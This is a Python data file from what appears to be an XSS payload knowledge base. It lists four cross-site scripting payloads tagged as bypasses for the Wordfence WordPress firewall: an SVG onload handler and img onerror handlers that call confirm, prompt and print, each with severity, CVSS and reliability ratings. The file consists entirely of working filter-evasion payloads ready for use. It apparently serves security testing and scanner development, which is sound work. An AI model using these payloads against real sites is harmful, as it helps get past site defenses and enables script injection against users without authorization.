#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Wordfence WAF Bypass Payloads
"""

from ..models import PayloadEntry


WORDFENCE_BYPASS_PAYLOADS = {
    "wf_1": PayloadEntry(
        payload="<svg/onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG onload bypass",
        tags=["wordfence", "waf-bypass", "svg"],
        waf_evasion=True,
        bypasses=["wordfence"],
        reliability="medium",
    ),
    "wf_2": PayloadEntry(
        payload="<img src=x onerror=confirm`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Confirm instead of alert",
        tags=["wordfence", "waf-bypass", "confirm"],
        waf_evasion=True,
        bypasses=["wordfence"],
        reliability="high",
    ),
    "wf_3": PayloadEntry(
        payload="<img src=x onerror=prompt`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Prompt instead of alert",
        tags=["wordfence", "waf-bypass", "prompt"],
        waf_evasion=True,
        bypasses=["wordfence"],
        reliability="high",
    ),
    "wf_4": PayloadEntry(
        payload="<img src=x onerror=print()>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Print instead of alert",
        tags=["wordfence", "waf-bypass", "print"],
        waf_evasion=True,
        bypasses=["wordfence"],
        reliability="high",
    ),
}

WORDFENCE_BYPASS_PAYLOADS_TOTAL = len(WORDFENCE_BYPASS_PAYLOADS)
